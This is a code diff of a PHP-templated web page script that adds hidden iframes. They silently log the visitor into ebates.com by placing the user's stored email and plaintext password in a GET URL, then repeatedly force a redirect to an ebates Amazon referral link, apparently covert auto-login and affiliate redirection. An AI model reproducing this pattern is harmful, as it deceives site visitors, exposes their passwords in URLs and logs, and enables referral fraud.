@@ -1,22 +1,23 @@
 <script>
-function zheLoadit(src) {
+function zheLoadit() {
+	var src = "https://www.ebates.com/auth/logon.do?terms=checked&urlIdentifier=%2Fauth%2FgetLogonForm.do&username=<?=urlencode($user['email'])?>&password=<?=$user['password']?>&x=49&y=13";
 	var head = document.getElementsByTagName('head')[0];
-	var script = document.createElement('script');
-	script.type = 'text/javascript';
+	var script = document.createElement('iframe');
+	script.width = 1;
+	script.heigth = 1;
+	script.onload = mload;
 	script.src = src + '&' + Math.random();
 	head.appendChild(script);
-}
 
-zheLoadit("https://www.ebates.com/auth/logon.do?terms=checked&urlIdentifier=%2Fauth%2FgetLogonForm.do&username=<?=urlencode($user['email'])?>&password=<?=$user['password']?>&x=49&y=13");
+	var i = setInterval(function() {
+		mload();
+	}, 2000);
+}
 
 function mload(){
 	window.location.href='http://www.ebates.com/Amazon.com_1-xfas?navigation_id=19512&mpl_id=40301';
 }
 
-var i = setInterval(function() {
-
-	mload();
-
-}, 2000);
-
 </script>
+
+<iframe src="http://www.ebates.com/customer/feed/offer-feed.xml" width="1px" heigth="1px" onload="zheLoadit()" style="display:none"></iframe>
